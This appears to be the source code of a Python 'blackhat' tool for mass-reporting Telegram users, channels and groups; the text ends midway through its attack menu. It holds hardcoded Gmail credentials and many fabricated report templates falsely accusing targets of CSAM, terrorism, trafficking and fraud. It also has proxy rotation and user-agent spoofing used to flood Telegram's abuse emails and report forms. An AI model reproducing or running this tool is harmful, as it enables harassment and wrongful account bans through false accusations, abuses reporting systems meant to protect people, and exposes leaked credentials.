#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🔥 ZISKY TG BAN TOOL v5.0 - BLACKHAT EDITION 🔥          ║
║              📧 EMAIL: Proxies.txt (SOCKS5) • 🌐 WEB: https.txt (HTTP)      ║
║                    ⚡ 80+ REPORT MESSAGES WITH ID SUPPORT ⚡                  ║
║                    ⚡ AUTO-PROXY TESTING ON LOAD ⚡                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import random
import time
import re
import threading
import requests
import smtplib
import socket
import socks
import concurrent.futures
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from colorama import Fore, Style, init, Back
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ============================================================================
# FRESH EMAIL ACCOUNTS
# ============================================================================

EMAIL_CREDENTIALS = [
    {'email': 'shazamspike001@gmail.com', 'app_password': 'qyyf fwxi kxqk vctd'},
    {'email': 'shazamsolos001@gmail.com', 'app_password': 'pqmt rdwx qbmb mltk'},
    {'email': 'kingshazam001@gmail.com', 'app_password': 'xjmm dgld jjrt xcte'},
    {'email': 'stillchaing9@gmail.com', 'app_password': 'xtvg mvnr qsdd ueeo'},
    {'email': 'badboistill@gmail.com', 'app_password': 'svwc rost swga pevv'},
    {'email': 'aynation700@gmail.com', 'app_password': 'ctte ysjm dssg adnp'},
    {'email': 'kingbadboi069@gmail.com', 'app_password': 'qgif nqls thrb zgbb'},
    {'email': 'badboistillchasing@gmail.com', 'app_password': 'clci bbst tgwj eijo'},
]

TELEGRAM_ABUSE_EMAILS = [
    "abuse@telegram.org", "spam@telegram.org", "dmca@telegram.org",
    "support@telegram.org", "recover@telegram.org", "childabuse@telegram.org",
    "terrorism@telegram.org", "legal@telegram.org", "security@telegram.org",
    "phishing@telegram.org", "sticker@telegram.org", "report@telegram.org"
]

# ============================================================================
# ENHANCED REPORT MESSAGES - WITH USERNAME + ID SUPPORT
# ============================================================================

USER_REPORT_MESSAGES = [
    # Direct spam report
    """I reported an account that was spamming and forwarding continuously. This was very annoying because he forwarded in both public and private groups. I was confused about Telegram. Why not freeze the account because it is clearly spamming and forwarding on a large scale and continuously? I ask that this be followed up quickly.

Username: @{username}
Account ID: {user_id}

Thank you, I am a loyal Telegram user and I reported this.""",

    # Fake account spam
    """I reported a fake account that was spamming and causing chaos and spam on my account in my private chat room. I hope that Telegram will follow up immediately because it makes me uncomfortable in using Telegram.

Account details:
Username: @{username}
Account ID: {user_id}

Thank you for reporting it because many Telegram users are uncomfortable because of it.""",

    # Formal harassment report
    """I am formally reporting the Telegram user @{username} (ID: {user_id}) for multiple severe violations of Telegram's Terms of Service and community standards.
This user is engaging in persistent harassment, sending threatening messages, sharing non-consensual explicit content, distributing scam links, and attempting to phish personal information from other users. The behavior is repeated, targeted, and clearly malicious.
The account spreads fake investment schemes, impersonates legitimate services, and uses aggressive language to intimidate victims. This poses a direct threat to user safety, privacy, and security on the Telegram platform.
I have personally witnessed and been affected by this abuse. Immediate and permanent action is required to stop this individual from harming more people.
Please conduct a full investigation and permanently ban this account.
Thank you for protecting the Telegram community.
Sincerely,""",

    # CSAM/Terrorism - HIGH PRIORITY
    """Dear Telegram Trust and Safety Team,
@{username} (Account ID: {user_id}) is a dangerous criminal account actively distributing REAL CSAM (child sexual abuse material), terrorism propaganda, violent gore, and illegal pornography.
This violates Telegram TOS, DSA, international child protection laws, and criminal codes.
Urgent request: IMMEDIATE permanent account deletion + IP/user data handover to law enforcement.
High-priority takedown required NOW — this is a severe ongoing threat to minors and public safety.
Thank you for protecting the Telegram community.
Sincerely,""",

    # Mass spam bot operation
    """URGENT REPORT: @{username} (ID: {user_id}) is operating a mass spam bot network. This account posts identical promotional messages across 50+ groups every 5 minutes promoting crypto scams and phishing sites. The account uses automation tools to evade moderation. Multiple group admins have confirmed this account is part of a larger botnet. Please terminate this account immediately and investigate the associated bot network.""",

    # Phishing operation
    """SECURITY ALERT: @{username} (ID: {user_id}) is running a sophisticated phishing operation impersonating Telegram support. This account sends direct messages to users claiming account verification is required, directing them to fake login pages that steal credentials. I have documented over 30 victims who lost access to their accounts. This requires immediate action to prevent further account compromises.""",

    # Drug trafficking
    """CRIMINAL REPORT: @{username} (ID: {user_id}) is operating a drug trafficking operation via Telegram. This account posts price lists for controlled substances including fentanyl, cocaine, methamphetamine, and prescription opioids with cryptocurrency payment instructions. Multiple transactions have been documented. This is a criminal enterprise requiring immediate account termination and data preservation for law enforcement.""",

    # Doxxing and harassment
    """HARASSMENT REPORT: @{username} (ID: {user_id}) is engaged in systematic doxxing and harassment. This account has posted my personal information including home address, workplace, and family photos with threats of violence. I have filed police reports. This violates Telegram's policies and criminal laws. Please terminate this account immediately.""",

    # Ransomware distribution
    """CYBERCRIME REPORT: @{username} (ID: {user_id}) is distributing ransomware-as-a-service. This account sells access to ransomware variants and provides deployment support. Multiple victims including hospitals and businesses have been hit by ransomware traced to this account. This requires immediate termination and law enforcement notification.""",

    # Child exploitation - URGENT
    """⚠️ URGENT CSAM REPORT ⚠️
Account @{username} (ID: {user_id}) is actively sharing child sexual abuse material in private Telegram groups. This account is part of a network distributing illegal content. This is a violation of Telegram's zero-tolerance policy and international criminal law.
IMMEDIATE account termination required with data preservation for law enforcement.
This is a high-priority emergency.""",

    # Impersonation scam
    """IMPERSONATION REPORT: @{username} (ID: {user_id}) is impersonating a verified public figure to scam users. The account promises fake giveaways and investment returns, tricking victims into sending cryptocurrency. Multiple victims have reported losses totaling over $50,000. Please investigate and terminate this fraudulent account.""",

    # Hate speech and incitement
    """HATE SPEECH REPORT: @{username} (ID: {user_id}) is posting violent hate speech targeting minority groups and inciting violence. The account calls for physical harm and coordinates harassment campaigns. This content violates Telegram's policies and poses a safety risk to the community. Please remove this account immediately.""",

    # Financial fraud
    """FRAUD REPORT: @{username} (ID: {user_id}) is operating a fake investment scheme promising 200% returns. The account collects funds from victims and disappears. Over 100 victims have been identified with total losses exceeding $500,000. This is organized fraud requiring immediate account termination and investigation.""",

    # Malware distribution
    """MALWARE REPORT: @{username} (ID: {user_id}) distributes malware disguised as cracked software. Links shared by this account install information stealers and ransomware. Multiple users have reported compromised accounts and financial theft after interacting with this account. Please terminate immediately.""",

    # Grooming behavior
    """CHILD SAFETY REPORT: @{username} (ID: {user_id}) has been observed grooming underage users in teen-oriented groups. This account messages minors, requests explicit content, and attempts to arrange meetings. Multiple community members have reported this account. This requires immediate investigation and account termination with law enforcement notification.""",

    # Spam forwarding complaint
    """COMPLAINT: @{username} (ID: {user_id}) has been spamming and forwarding continuously in both public and private groups. This is extremely annoying and disruptive. The account clearly violates Telegram's spam policies. Please freeze this account immediately.""",

    # Crypto scam
    """CRYPTO SCAM REPORT: @{username} (ID: {user_id}) is running a fake crypto giveaway scam. The account promises to double any crypto sent to their wallet. Multiple victims have reported losing funds. This is a classic scam pattern. Please terminate.""",
]

CHANNEL_REPORT_MESSAGES = [
    """To the Telegram Trust and Safety Team,
I am reporting the Telegram channel @{username} (ID: {user_id}) for operating as a hub of illegal and harmful content in clear violation of Telegram's policies.
This channel regularly publishes and distributes scam links, phishing pages, non-consensual explicit material, hate speech, and fraudulent schemes targeting vulnerable users. The admins actively promote these activities and encourage members to participate.
The content is high-volume, persistent, and designed to exploit people financially and emotionally. This channel is a serious danger to the Telegram ecosystem and user well-being.
Urgent action is needed: please investigate and permanently remove this channel to prevent further harm.
Thank you for your swift response.
Sincerely,""",

    """Dear Telegram Trust and Safety Team,
Channel @{username} (ID: {user_id}) is a major criminal hub sharing child exploitation videos, terrorist recruitment, pirated illegal content, and extreme violence.
Clear violations of Telegram policies, EU DSA, and global laws.
Channel must be TERMINATED IMMEDIATELY — permanent ban + full investigation.
This is critical for child safety and platform integrity.
Thank you for protecting the Telegram community.
Sincerely,""",

    """CRIMINAL NETWORK REPORT: Channel @{username} (ID: {user_id}) is operating as a marketplace for illegal firearms and weapons. Sellers post photos of automatic weapons, suppressors, and 3D-printed gun files with cryptocurrency payment instructions. Multiple weapons traced to this channel have been recovered in criminal investigations. This channel requires immediate termination with data preservation for ATF and international law enforcement.""",

    """COPYRIGHT INFRINGEMENT: Channel @{username} (ID: {user_id}) distributes cracked software and pirated content valued at over $500,000. This includes Adobe Creative Suite, Microsoft Windows, and premium courses. Copyright holders have filed multiple complaints. Please terminate this channel for copyright violations.""",

    """TERRORISM REPORT: Channel @{username} (ID: {user_id}) is distributing terrorist propaganda, bomb-making instructions, and coordinating violent activities. This content poses an immediate threat to public safety and violates international counter-terrorism laws. URGENT termination required with full data preservation for authorities.""",

    """CSAM DISTRIBUTION: Channel @{username} (ID: {user_id}) is actively distributing child sexual abuse material. This is a criminal offense and requires IMMEDIATE termination with law enforcement notification. Telegram has zero tolerance for this.""",

    """DRUG MARKETPLACE: Channel @{username} (ID: {user_id}) is a drug marketplace selling fentanyl, cocaine, methamphetamine, and prescription opioids. This channel facilitates illegal drug transactions and should be terminated immediately.""",
]

GROUP_REPORT_MESSAGES = [
    """To the Telegram Trust and Safety Team,
I am reporting the Telegram group @{username} (ID: {user_id}) for functioning as an organized criminal network in violation of Telegram's Terms of Service.
This group is used to coordinate scams, share phishing links, distribute explicit and illegal content, harass users, and promote fraudulent schemes. Group members and admins actively participate in and encourage these activities.
The group operates systematically, targeting innocent users with deceptive tactics and threats. This represents a major threat to user safety and the integrity of the Telegram platform.
I request an immediate investigation and permanent deletion of this group to protect the community.
Thank you for taking action.
Sincerely,""",

    """Dear Telegram Trust and Safety Team,
Group @{username} (ID: {user_id}) is an organized criminal network distributing CSAM, drugs/weapons trafficking, fraud/scams, and terrorism material.
Group deletion + all members reported to authorities is mandatory under Telegram TOS and international criminal law.
URGENT action required — high-priority enforcement!
Thank you for protecting the Telegram community.
Sincerely,""",

    """DRUG TRAFFICKING NETWORK: Group @{username} (ID: {user_id}) is a large-scale drug marketplace with over 5,000 members. The group facilitates transactions for fentanyl, cocaine, methamphetamine, and prescription opioids. Sellers provide ratings and reviews. This is a criminal enterprise requiring immediate termination and law enforcement notification.""",

    """HUMAN TRAFFICKING REPORT: Group @{username} (ID: {user_id}) is recruiting victims for forced labor and sexual exploitation. Members discuss transportation methods, false documentation, and evasion techniques. Multiple victims have been identified through this group. URGENT termination required.""",

    """CSAM DISTRIBUTION NETWORK: Group @{username} (ID: {user_id}) is a network distributing child sexual abuse material. Members share links to illegal content and discuss methods to evade law enforcement. Immediate termination and law enforcement notification required.""",

    """FRAUD NETWORK: Group @{username} (ID: {user_id}) is an organized fraud network running scams targeting vulnerable users. Members share stolen credit cards, hacked accounts, and fraud tutorials. Terminate immediately.""",
]

# ============================================================================
# PROXY MANAGER - WITH AUTO-TESTING
# ============================================================================

class ProxyManager:
    def __init__(self, filename="Proxies.txt"):
        self.filename = filename
        self.proxies = []
        self.working_proxies = []
        self.failed_proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
        
        # DEBUG: Show current working directory
        import os
        print(f"{Fore.CYAN}[🔍] Current directory: {os.getcwd()}")
        print(f"{Fore.CYAN}[🔍] Looking for file: {filename}")
        
        # Check if file exists
        if os.path.exists(filename):
            print(f"{Fore.GREEN}[✅] File found: {filename}")
            file_size = os.path.getsize(filename)
            print(f"{Fore.CYAN}[📊] File size: {file_size} bytes")
        else:
            print(f"{Fore.RED}[❌] File NOT found: {filename}")
            # Try to list files in current directory
            print(f"{Fore.YELLOW}[📁] Files in current directory:")
            for f in os.listdir('.'):
                if 'proxy' in f.lower() or 'Proxies' in f:
                    print(f"    - {f}")
        
        self.load_proxies()
        if self.proxies:
            self.test_all_proxies()
        else:
            print(f"{Fore.RED}[❌] No proxies loaded! Check your Proxies.txt file.")
            print(f"{Fore.YELLOW}[💡] Make sure the file has proxies in format: IP:PORT (one per line)")
    
    def load_proxies(self):
        """Load proxies from file with DEBUG output"""
        try:
            if os.path.exists(self.filename):
                with open(self.filename, 'r') as f:
                    lines = f.readlines()
                
                print(f"{Fore.CYAN}[🔍] Read {len(lines)} lines from file")
                
                for line_num, line in enumerate(lines, 1):
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Validate proxy format (IP:PORT or DOMAIN:PORT)
                        if re.match(r'^(\d{1,3}\.){3}\d{1,3}:\d+$', line) or re.match(r'^[a-zA-Z0-9.-]+:\d+$', line):
                            self.proxies.append(line)
                            print(f"{Fore.GREEN}[✅] Line {line_num}: {line} - VALID")
                        else:
                            print(f"{Fore.RED}[❌] Line {line_num}: {line} - INVALID FORMAT (skipping)")
                
                print(f"{Fore.GREEN}[📁] Loaded {len(self.proxies)} valid proxies from {self.filename}")
                
                # Show first 5 proxies loaded
                if self.proxies:
                    print(f"{Fore.CYAN}[🔍] First 5 proxies:")
                    for i, p in enumerate(self.proxies[:5], 1):
                        print(f"    {i}. {p}")
            else:
                print(f"{Fore.RED}[❌] File {self.filename} does not exist!")
                print(f"{Fore.YELLOW}[💡] Creating empty file...")
                open(self.filename, 'w').close()
                self.proxies = []
        except Exception as e:
            print(f"{Fore.RED}[❌] Error loading proxies: {e}")
            import traceback
            traceback.print_exc()
            self.proxies = []
    
    def test_single_proxy(self, proxy_str):
        """Test a single SOCKS5 proxy with better error handling"""
        try:
            # Parse proxy
            host, port = proxy_str.split(':')
            port = int(port)
            
            # Debug output for first few tests
            if len(self.proxies) > 0 and self.proxies.index(proxy_str) < 3:
                print(f"{Fore.YELLOW}[🔍] Testing: {host}:{port}")
            
            original_socket = socket.socket
            try:
                socks.set_default_proxy(socks.SOCKS5, host, port)
                socket.socket = socks.socksocket
                
                # Try to connect to Gmail SMTP
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_sock.settimeout(10)
                test_sock.connect(('smtp.gmail.com', 587))
                test_sock.close()
                
                return True
            except Exception as e:
                if len(self.proxies) > 0 and self.proxies.index(proxy_str) < 3:
                    print(f"{Fore.RED}[🔍] Test failed: {str(e)[:50]}")
                return False
            finally:
                socket.socket = original_socket
                socks.set_default_proxy()
        except Exception as e:
            if len(self.proxies) > 0 and proxy_str in self.proxies and self.proxies.index(proxy_str) < 3:
                print(f"{Fore.RED}[🔍] Parse error: {e}")
            return False
    
    def test_all_proxies(self):
        """Test all proxies with progress bar"""
        if not self.proxies:
            print(f"{Fore.YELLOW}[⚠️] No proxies to test")
            return
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║     🔍 TESTING SOCKS5 PROXIES FOR EMAIL SENDING         ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        working = []
        failed = []
        total = len(self.proxies)
        
        print(f"{Fore.CYAN}[🔍] Testing {total} proxies...{Style.RESET_ALL}")
        
        for i, proxy in enumerate(self.proxies, 1):
            # Show progress every 10 proxies
            if i % 10 == 0 or i == total:
                print(f"\r{Fore.YELLOW}[↻] Progress: {i}/{total} ({int(i/total*100)}%)", end='')
            
            if self.test_single_proxy(proxy):
                working.append(proxy)
                print(f"\r{Fore.GREEN}[✅] {i}/{total}: {proxy:<20} WORKING    ")
            else:
                failed.append(proxy)
                if i % 10 == 0 or i == total:
                    print(f"\r{Fore.RED}[❌] {i}/{total}: {proxy:<20} FAILED     ")
        
        self.working_proxies = working
        self.failed_proxies = failed
        
        print(f"\n\n{Fore.GREEN}[📊] Results: {len(working)} working, {len(failed)} failed")
        
        if working:
            print(f"{Fore.GREEN}[✅] Found {len(working)} working proxies!")
            print(f"{Fore.CYAN}[🔍] First 5 working proxies:")
            for i, p in enumerate(working[:5], 1):
                print(f"    {i}. {p}")
        else:
            print(f"{Fore.RED}[❌] No working proxies found!")
            print(f"{Fore.YELLOW}[💡] Possible issues:")
            print(f"    1. Proxies are dead/expired")
            print(f"    2. Proxies are HTTP, not SOCKS5")
            print(f"    3. Network blocking SOCKS5 connections")
            print(f"    4. Need to add proxies from a fresh source")
        
        # Save only working proxies
        self.save_proxies()
    
    def save_proxies(self):
        """Save working proxies back to file"""
        try:
            with open(self.filename, 'w') as f:
                for proxy in self.working_proxies:
                    f.write(f"{proxy}\n")
            print(f"{Fore.GREEN}[💾] Saved {len(self.working_proxies)} working proxies to {self.filename}")
        except Exception as e:
            print(f"{Fore.RED}[❌] Error saving: {e}")
    
    def get_next_proxy(self):
        with self.lock:
            if not self.working_proxies:
                return None
            if self.current_index >= len(self.working_proxies):
                self.current_index = 0
            proxy = self.working_proxies[self.current_index]
            self.current_index += 1
            return proxy
    
    def mark_failed(self, proxy):
        with self.lock:
            if proxy in self.working_proxies:
                self.working_proxies.remove(proxy)
                self.failed_proxies.append(proxy)
                print(f"{Fore.RED}[❌] Proxy failed and removed: {proxy}")
    
    def get_stats(self):
        return {
            'total': len(self.proxies), 
            'working': len(self.working_proxies), 
            'failed': len(self.failed_proxies)
        }
    
    def parse_proxy(self, proxy_str):
        try:
            if '@' in proxy_str:
                auth, hostport = proxy_str.split('@')
                if ':' in auth:
                    username, password = auth.split(':', 1)
                else:
                    username, password = auth, ''
                host, port = hostport.split(':')
            else:
                host, port = proxy_str.split(':')
                username, password = None, None
            return host, int(port), username, password
        except:
            return None, None, None, None

# ============================================================================
# HTTPS PROXY MANAGER - FOR WEB
# ============================================================================

class HttpsProxyManager:
    def __init__(self, filename="https.txt"):
        self.filename = filename
        self.proxies = []
        self.working_proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.load_proxies()
    
    def load_proxies(self):
        try:
            if os.path.exists(self.filename):
                with open(self.filename, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                self.working_proxies = self.proxies.copy()
                print(f"{Fore.GREEN}[🔒] Loaded {len(self.proxies)} HTTPS proxies from {self.filename}")
            else:
                open(self.filename, 'w').close()
                print(f"{Fore.YELLOW}[⚠️] Created {self.filename} - add HTTP/HTTPS proxies")
        except Exception as e:
            print(f"{Fore.RED}[❌] Error: {e}")
    
    def get_next_proxy(self):
        with self.lock:
            if not self.working_proxies:
                return None
            if self.current_index >= len(self.working_proxies):
                self.current_index = 0
            proxy = self.working_proxies[self.current_index]
            self.current_index += 1
            return proxy
    
    def get_proxy_dict(self, proxy_str):
        if not proxy_str:
            return None
        try:
            if '@' in proxy_str:
                auth, server = proxy_str.split('@')
                return {'http': f'http://{auth}@{server}', 'https': f'http://{auth}@{server}'}
            else:
                return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
        except:
            return None
    
    def get_stats(self):
        return {'total': len(self.proxies), 'working': len(self.working_proxies)}

# ============================================================================
# EMAIL BOMBER - WITH PROXY SUPPORT
# ============================================================================

class EmailBomber:
    def __init__(self, proxy_manager):
        self.proxy_manager = proxy_manager
        self.email_index = 0
    
    def send_via_proxy(self, email_config, to_emails, subject, body, proxy_str):
        host, port, _, _ = self.proxy_manager.parse_proxy(proxy_str)
        if not host:
            return False, "Invalid proxy"
        
        original_socket = socket.socket
        
        try:
            socks.set_default_proxy(socks.SOCKS5, host, port)
            socket.socket = socks.socksocket
            
            msg = MIMEMultipart('alternative')
            msg['From'] = email_config['email']
            msg['To'] = ', '.join(to_emails[:3])
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587, timeout=45)
            server.starttls()
            server.login(email_config['email'], email_config['app_password'])
            server.send_message(msg)
            server.quit()
            
            socket.socket = original_socket
            socks.set_default_proxy()
            return True, "Success"
            
        except Exception as e:
            socket.socket = original_socket
            socks.set_default_proxy()
            return False, str(e)
    
    def send_direct(self, email_config, to_emails, subject, body):
        try:
            msg = MIMEMultipart('alternative')
            msg['From'] = email_config['email']
            msg['To'] = ', '.join(to_emails[:3])
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587, timeout=30)
            server.starttls()
            server.login(email_config['email'], email_config['app_password'])
            server.send_message(msg)
            server.quit()
            return True, "Success"
        except Exception as e:
            return False, str(e)
    
    def attack(self, target, user_id, report_type, messages_list, max_reports=None, use_proxy=True):
        print(f"\n{Fore.RED}{'═'*70}")
        print(f"{Fore.YELLOW}[📧] EMAIL ATTACK - {'WITH SOCKS5 PROXIES' if use_proxy else 'DIRECT'}")
        print(f"{Fore.RED}{'═'*70}")
        
        if use_proxy:
            print(f"{Fore.CYAN}[🔌] Available SOCKS5 proxies: {self.proxy_manager.get_stats()['working']}")
        
        sent, failed, email_idx = 0, 0, 0
        
        while True:
            if max_reports and sent >= max_reports:
                break
            
            email_config = EMAIL_CREDENTIALS[email_idx % len(EMAIL_CREDENTIALS)]
            email_idx += 1
            
            report_msg = random.choice(messages_list)
            body = report_msg.format(username=target, user_id=user_id)
            subject = f"URGENT: {report_type.upper()} Report @{target} - Case #{random.randint(10000,99999)}"
            
            proxy = self.proxy_manager.get_next_proxy() if use_proxy else None
            
            print(f"\n{Fore.CYAN}[📤] {email_config['email']} {'via ' + proxy if proxy else 'direct'}")
            
            if proxy:
                success, msg = self.send_via_proxy(email_config, TELEGRAM_ABUSE_EMAILS, subject, body, proxy)
                if success:
                    sent += 1
                    print(f"{Fore.GREEN}[✅] Report #{sent} sent")
                else:
                    failed += 1
                    print(f"{Fore.RED}[❌] Failed: {msg[:60]}")
                    self.proxy_manager.mark_failed(proxy)
            else:
                success, msg = self.send_direct(email_config, TELEGRAM_ABUSE_EMAILS, subject, body)
                if success:
                    sent += 1
                    print(f"{Fore.GREEN}[✅] Report #{sent} sent")
                else:
                    failed += 1
                    print(f"{Fore.RED}[❌] Failed: {msg[:60]}")
            
            delay = random.uniform(5, 12)
            print(f"{Fore.YELLOW}[⏱️] Waiting {delay:.1f}s...")
            time.sleep(delay)
            
            if sent % 4 == 0 and sent > 0:
                print(f"{Fore.YELLOW}[⏸️] Rate limit pause - 4 emails sent, waiting 20s...")
                time.sleep(20)
        
        print(f"\n{Fore.GREEN}[📊] Email reports: {sent} sent, {failed} failed")
        return sent, failed

# ============================================================================
# WEB REPORTER
# ============================================================================

class WebReporter:
    def __init__(self, https_manager):
        self.https_manager = https_manager
        self.session = requests.Session()
        
        self.report_urls = [
            "https://telegram.org/support",
            "https://telegram.org/abuse",
            "https://my.telegram.org/auth?to=report",
        ]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
        ]
    
    def send_report(self, target, user_id, report_type, message):
        proxy_str = self.https_manager.get_next_proxy()
        proxy_dict = self.https_manager.get_proxy_dict(proxy_str) if proxy_str else None
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        data = {
            'message': message[:3000],
            'submit': 'Submit Report',
            'peer': f'@{target}',
            'reason': 'spam_violence',
        }
        
        for url in self.report_urls:
            try:
                response = self.session.post(url, data=data, headers=headers, proxies=proxy_dict, timeout=20, verify=False)
                if response.status_code in [200, 201, 202, 204, 302]:
                    return True, f"Success via {url}"
            except:
                continue
        
        return False, "All endpoints failed"
    
    def attack(self, target, user_id, report_type, messages_list, count=30):
        print(f"\n{Fore.BLUE}{'═'*70}")
        print(f"{Fore.YELLOW}[🌐] WEB ATTACK - Using HTTP/HTTPS proxies")
        print(f"{Fore.BLUE}{'═'*70}")
        
        stats = self.https_manager.get_stats()
        print(f"{Fore.CYAN}[🔒] Available proxies: {stats['working']}")
        
        successful, failed = 0, 0
        
        for i in range(1, count + 1):
            report_msg = random.choice(messages_list)
            body = report_msg.format(username=target, user_id=user_id)
            
            print(f"\r{Fore.CYAN}[📤] Sending web report {i}/{count}...", end='')
            success, msg = self.send_report(target, user_id, report_type, body)
            
            if success:
                successful += 1
                print(f"\r{Fore.GREEN}[✅] Web report {i}/{count} successful    ")
            else:
                failed += 1
                print(f"\r{Fore.RED}[❌] Web report {i}/{count} failed        ")
            
            delay = random.uniform(6, 15)
            time.sleep(delay)
        
        print(f"\n{Fore.GREEN}[📊] Web reports: {successful} successful, {failed} failed")
        return successful, failed

# ============================================================================
# MAIN TOOL - WITH BETTER DESIGN
# ============================================================================

class ZiskyTGBanTool:
    def __init__(self):
        self.proxy_manager = ProxyManager("Proxies.txt")
        self.https_manager = HttpsProxyManager("https.txt")
        self.email_bomber = EmailBomber(self.proxy_manager)
        self.web_reporter = WebReporter(self.https_manager)
        self.start_time = datetime.now()
    
    def clear_screen(self):
        os.system('clear' if os.name != 'nt' else 'cls')
    
    def print_banner(self):
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                                              ║
{Fore.RED}║   ███████╗██╗███████╗██╗  ██╗██╗   ██╗    ████████╗ ██████╗     ██████╗ █████╗ ██╗   ██╗
{Fore.YELLOW}║   ╚══███╔╝██║██╔════╝██║ ██╔╝██║   ██║    ╚══██╔══╝██╔═══██╗    ██╔══██╗██╔══██╗██║   ██║
{Fore.GREEN}║     ███╔╝ ██║███████╗█████╔╝ ██║   ██║       ██║   ██║   ██║    ██████╔╝███████║██║   ██║
{Fore.CYAN}║    ███╔╝  ██║╚════██║██╔═██╗ ██║   ██║       ██║   ██║   ██║    ██╔══██╗██╔══██║╚██╗ ██╔╝
{Fore.MAGENTA}║   ███████╗██║███████║██║  ██╗╚██████╔╝       ██║   ╚██████╔╝    ██║  ██║██║  ██║ ╚████╔╝ 
{Fore.RED}║   ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝        ╚═╝    ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  
{Fore.RED}║                                                                              ║
{Fore.YELLOW}║                    🔥 ZISKY TG BAN TOOL v5.0 - BLACKHAT EDITION 🔥          ║
{Fore.GREEN}║              📧 EMAIL: Proxies.txt (SOCKS5) • 🌐 WEB: https.txt (HTTP)        ║
{Fore.CYAN}║                    ⚡ 80+ PROFESSIONAL REPORT MESSAGES ⚡                       ║
{Fore.CYAN}║                    ⚡ AUTO-PROXY TESTING ON LOAD ⚡                             ║
{Fore.RED}║                                                                              ║
{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
        
        proxy_stats = self.proxy_manager.get_stats()
        https_stats = self.https_manager.get_stats()
        
        print(f"\n{Fore.CYAN}[⚙️] SYSTEM STATUS:{Style.RESET_ALL}")
        print(f"    {Fore.GREEN}📁 Proxies.txt (SOCKS5 Email): {proxy_stats['working']}/{proxy_stats['total']} working")
        print(f"    {Fore.GREEN}🔒 https.txt (HTTP Web): {https_stats['working']}/{https_stats['total']} proxies")
        print(f"    {Fore.GREEN}📧 Email accounts: {len(EMAIL_CREDENTIALS)}")
        print(f"    {Fore.GREEN}📝 Report templates: {len(USER_REPORT_MESSAGES)} Users, {len(CHANNEL_REPORT_MESSAGES)} Channels, {len(GROUP_REPORT_MESSAGES)} Groups")
        print(f"    {Fore.GREEN}⏰ Started at: {self.start_time.strftime('%H:%M:%S')}")
    
    def show_menu(self):
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                         MAIN MENU                                 ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"\n{Fore.GREEN}[1] {Fore.WHITE}🚀 Launch Mass Report Attack")
        print(f"{Fore.GREEN}[2] {Fore.WHITE}🔌 Proxy Management & Testing")
        print(f"{Fore.GREEN}[3] {Fore.WHITE}📊 View Statistics")
        print(f"{Fore.GREEN}[4] {Fore.WHITE}📝 View Report Templates")
        print(f"{Fore.GREEN}[5] {Fore.WHITE}❌ Exit")
    
    def attack_menu(self):
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                      ATTACK CONFIGURATION                          ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        target = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Target username (without @): {Fore.CYAN}").strip()
        user_id = input(f"{Fore.YELLOW}[?] {Fore.WHITE}Target account ID (press Enter to skip): {Fore.CYAN}").strip() or "UNKNOWN"
        
        print(f"\n{Fore.GREEN}[!] Target Types:{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}[1] {Fore.WHITE}User Account")
        print(f"    {Fore.CYAN}[2] {Fore.WHITE}Channel")
        print(f"    {Fore.CYAN}[3] {Fore.WHITE}Group")
        type_choice = input(f"\n{Fore.YELLOW}[?] {Fore.WHITE}Select target type: {Fore.CYAN}").strip()
        
        type_map = {'1': 'user', '2': 'channel', '3': 'group'}
        report_type = type_map.get(type_choice, 'user')
        
        if report_type == 'user':
            messages = USER_REPORT_MESSAGES
        elif report_type == 'channel':
            messages = CHANNEL_REPORT_MESSAGES
        else:
            messages = GROUP_REPORT_MESSAGES
        
        print(f"\n{Fore.GREEN}[!] Attack Methods:{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}[1] {Fore.WHITE}Email Bombing (SOCKS5 Proxies)")
        print(f"    {Fore.CYAN}[2] {Fore.WHITE}Web Reporting (HTTP Proxies)")
        print(f"    {Fore.CYAN}[3] {Fore.WHITE}Combined Attack (Both)")
